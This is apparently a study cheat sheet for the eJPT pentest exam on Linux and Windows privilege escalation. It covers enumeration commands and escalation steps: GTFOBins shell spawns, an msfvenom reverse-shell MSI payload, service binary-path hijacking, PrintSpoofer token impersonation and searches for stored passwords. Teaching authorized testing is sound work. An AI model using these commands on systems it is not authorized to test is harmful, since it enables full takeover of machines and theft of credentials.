# Linux & Windows Privilege Escalation Cheat Sheet

Privilege escalation — going from an initial low-privilege foothold to root/SYSTEM — is the step eJPT tests immediately after exploitation on nearly every host-based objective. This document covers the host-level **privesc** enumeration and techniques for both Linux and Windows targets.

---

## Table of Contents

1. [Privesc Methodology](#1-privesc-methodology)
2. [Linux Enumeration](#2-linux-enumeration)
3. [Linux Common Privesc Techniques](#3-linux-common-privesc-techniques)
4. [Windows Enumeration](#4-windows-enumeration)
5. [Windows Common Privesc Techniques](#5-windows-common-privesc-techniques)
6. [Cross-OS Notes](#6-cross-os-notes)
7. [Quick Command Reference](#7-quick-command-reference)

---

## 1. Privesc Methodology

The same general loop applies regardless of operating system — only the specific commands change.

```
Enumerate → Identify misconfiguration/vulnerability → Exploit → Verify
```

| Step | What it means |
|---|---|
| **Enumerate** | Gather everything about the host: users, permissions, running processes, installed software, scheduled tasks |
| **Identify** | Cross-reference findings against known misconfiguration patterns (weak permissions, outdated software, credential reuse) |
| **Exploit** | Apply the specific technique — abuse a SUID binary, hijack a cron job, exploit an unquoted service path |
| **Verify** | Confirm the new privilege level (`id`, `whoami`, `whoami /priv`) and stabilize access before moving on |

> Run automated enumeration first to get broad coverage fast, then manually verify anything flagged — automated tools produce false positives and can miss context-specific misconfigurations a human would catch.

---

## 2. Linux Enumeration

Both automated scripts and the manual commands they wrap, since knowing the manual commands matters when a script can't be uploaded.

```bash
# Automated (upload and run, or curl | bash if outbound access exists)
./linpeas.sh                                    # Broad, color-coded enumeration script
./LinEnum.sh -t                                  # Older, thorough alternative

# Manual — sudo rights
sudo -l                                          # What can the current user run as another user/root?

# Manual — SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null           # SUID
find / -perm -2000 -type f 2>/dev/null           # SGID

# Manual — scheduled tasks
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
crontab -l                                       # Current user's own cron jobs

# Manual — Linux capabilities (can grant SUID-like power without the SUID bit)
getcap -r / 2>/dev/null

# Manual — writable sensitive files
ls -la /etc/passwd /etc/shadow                   # Is /etc/passwd writable by the current user?
find / -writable -type d 2>/dev/null | grep -v /proc   # World-writable directories

# Kernel / OS version (for exploit matching)
uname -a
cat /etc/os-release
```

> `linpeas.sh` output is color-coded by likelihood of exploitability (red/yellow highlights) — treat that as a prioritized checklist, not a guarantee; always confirm manually before attempting an exploit.

---

## 3. Linux Common Privesc Techniques

The exploitation half of the loop — turning an enumeration finding into an actual privilege gain.

| Technique | Summary |
|---|---|
| **SUID binary abuse** | A SUID binary that can spawn a shell, read files, or write as its owner (often root) can be abused directly — check any non-standard SUID binary against **GTFOBins** (gtfobins.github.io) for a documented escalation path |
| **Cron job hijack** | A cron job running as root that executes a script writable by your current user — edit the script (or replace it if the path itself is writable) to add a reverse shell/command |
| **Sudo misconfiguration** | `sudo -l` shows a binary you can run as root with no password — check GTFOBins for that binary's `sudo` escalation pattern (e.g. `sudo vim` → `:!/bin/sh`) |
| **Kernel exploits** | An outdated kernel version matched against public exploit-DB/CVE listings (e.g. Dirty Pipe, Dirty COW) — last resort, higher risk of crashing the box |

```bash
# Example: SUID find binary (classic GTFOBins entry)
find . -exec /bin/sh -p \; -quit

# Example: sudo-permitted binary abuse
sudo /usr/bin/vim -c ':!/bin/sh'

# Kernel exploit search by version string
searchsploit linux kernel 5.4    # Cross-check hits against exploit-db.com before running anything
```

> Treat kernel exploits as a last resort — always search **GTFOBins** and check `sudo -l` / SUID output first. Kernel exploits are noisier, less reliable, and more likely to crash the target than a clean misconfiguration-based path.

---

## 4. Windows Enumeration

The Windows equivalent enumeration pass — automated tooling plus the manual commands worth knowing when tool upload isn't possible.

```bash
# Automated
winPEAS.exe                                      # Broad, color-coded enumeration (like linpeas for Windows)

# Manual — current privileges
whoami /priv                                     # Enabled/disabled privileges (e.g. SeImpersonatePrivilege)
whoami /groups                                   # Group memberships (including privileged local groups)

# Manual — system/patch info
systeminfo                                       # OS build, patch level — feed into exploit-suggester tools

# Manual — service permissions
accesschk.exe -uwcqv "Authenticated Users" *      # Services modifiable by low-privilege users (Sysinternals)
sc qc <servicename>                               # Query a service's binary path and start type

# Manual — scheduled tasks
schtasks /query /fo LIST /v

# Manual — unquoted service paths (search for spaces in an unquoted BINARY_PATH_NAME)
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

> `systeminfo` output feeds directly into tools like **Windows Exploit Suggester** — match the "Hotfix(s)" list against known missing-patch privesc exploits before attempting anything manually.

---

## 5. Windows Common Privesc Techniques

Common Windows-specific misconfiguration classes, roughly in order of how often they show up in eJPT-style labs.

| Technique | Summary |
|---|---|
| **AlwaysInstallElevated** | If two registry keys are both set to `1`, any user can install an `.msi` with SYSTEM privileges — build a malicious MSI with `msfvenom -p windows/x64/meterpreter/reverse_tcp -f msi -o evil.msi` |
| **Unquoted service path** | A service binary path containing spaces and no quotes lets Windows try each space-delimited segment as an executable — drop a malicious binary at the earliest matching path |
| **Weak service permissions** | If the current user can reconfigure a service's binary path (`sc config`) or restart it, point it at a malicious executable and restart the service |
| **Token impersonation (Potato family)** | With `SeImpersonatePrivilege` enabled, tools like **JuicyPotato**, **RoguePotato**, or **PrintSpoofer** coerce a SYSTEM token and impersonate it — common on service accounts |
| **Stored/saved credentials** | Plaintext or recoverable credentials in unattended install files, PowerShell history, saved RDP/WinSCP sessions, or `cmdkey /list` |

```bash
# AlwaysInstallElevated check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Reconfigure a weakly-permissioned service to run a payload, then restart it
sc config <servicename> binpath= "C:\payload.exe"
sc start <servicename>

# Token impersonation with PrintSpoofer (requires SeImpersonatePrivilege)
PrintSpoofer.exe -i -c cmd

# Search stored credentials
cmdkey /list
findstr /si password *.txt *.xml *.ini *.config
```

> Check `whoami /priv` for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` early — their presence on a service account is one of the strongest single signals that a Potato-family exploit will work.

---

## 6. Cross-OS Notes

This document is the host-level companion to the domain/network-level enumeration cheat sheets already in this collection.

- `active-directory-enumeration-cheatsheet-professional.md` covers domain-wide enumeration and attacks (Kerberoasting, DCSync, lateral movement) once a host is domain-joined — this file stops at the single-host boundary.
- `smb-windows-enumeration-cheatsheet-professional.md` covers pre-exploitation SMB enumeration and vulnerabilities like EternalBlue used to *get* the initial foothold — this file picks up *after* that foothold exists.
- `metasploit-cheatsheet-professional.md` section 6 covers automating the enumeration side of this document via `post/multi/recon/local_exploit_suggester` and related `post/` modules, if a Meterpreter session is already in hand.

---

## 7. Quick Command Reference

A single-page lookup for every command covered above.

| Need | Command |
|---|---|
| Linux auto-enum | `./linpeas.sh` |
| Linux sudo rights | `sudo -l` |
| Linux SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| Linux capabilities | `getcap -r / 2>/dev/null` |
| Linux cron jobs | `cat /etc/crontab` |
| GTFOBins lookup | gtfobins.github.io — search by binary name |
| Windows auto-enum | `winPEAS.exe` |
| Windows privileges | `whoami /priv` |
| Windows patch/build info | `systeminfo` |
| Windows service perms | `accesschk.exe -uwcqv "Authenticated Users" *` |
| Unquoted service path search | `wmic service get name,pathname,startmode` |
| AlwaysInstallElevated check | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
| Token impersonation | `PrintSpoofer.exe -i -c cmd` |
| Reconfigure weak service | `sc config <svc> binpath= "C:\payload.exe"` |

---

*Prepared as a reference for the eJPT host/network pentest module. All techniques should only be used within written authorization (scope/RoE).*
